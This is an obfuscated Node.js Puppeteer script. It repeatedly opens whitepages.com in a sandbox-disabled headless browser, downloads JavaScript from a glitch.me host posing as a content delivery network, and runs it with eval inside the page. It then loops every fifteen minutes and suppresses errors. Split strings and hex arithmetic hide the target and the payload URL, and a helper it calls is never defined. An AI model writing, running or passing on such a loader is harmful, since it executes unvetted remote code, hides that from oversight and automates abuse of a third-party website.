((async () => {
  const e = require('puppeteer'),
    f = await e['launch']({
      'headless': 0x1,
      'args': [
        '--no-sandb' + 'ox',
        '--disable-' + 'setuid-san' + 'dbox'
      ]
    });
  (async function g() {
    let h = 0xb * -0x2a1 + -0x1802 + 0x31d * 0x11;
    const i = await f['createInco' + 'gnitoBrows' + 'erContext'](),
      j = await i['newPage']();
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      'timeout': 0x11170
    })['catch'](k => h++), h ? (await j['close'](), await i['close'](), g()) : (await j['evaluate'](() => {
      let k = new XMLHttpRequest();
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1eff * -0x1 + 0x32 * 0x22 + 0x185b), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0x107d47 * -0x1 + -0x10c * -0x1391 + 0x1 * -0x173d73), await j['close'](), await i['close'](), g());
  }());
})());